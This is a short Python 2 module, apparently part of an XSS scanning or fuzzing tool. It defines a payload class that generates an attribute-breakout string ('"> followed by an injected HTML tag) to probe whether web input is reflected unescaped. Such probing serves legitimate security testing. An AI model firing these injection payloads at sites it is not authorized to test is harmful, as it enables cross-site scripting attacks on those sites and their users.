#! /usr/bin/env python
# coding:utf-8
# Author qingniao
from lib.payload import Payload
from data.tag import Tag


class NullTag(Payload):
    __doc__ = 'make tag'

    def __init__(self, conf=None):
        super(Payload, self).__init__()
        self.name = 'tag'
        self.version = '1.0'
        self.exploit = '\'"><{tag}></{tagend}>'
        self.data = {'tag': Tag(),
                     'tagend': Tag()
                     }

    def make_exploit(self):
        for _ in self.data:
            yield self.exploit.format(tag=self.data['tag'], tagend=self.data['tagend'])

    def next(self):
        return self.make_exploit()


def get_payload(conf=None):
    return NullTag(conf)

if __name__ == '__main__':
    s=get_payload()
    for x in s:
        print x


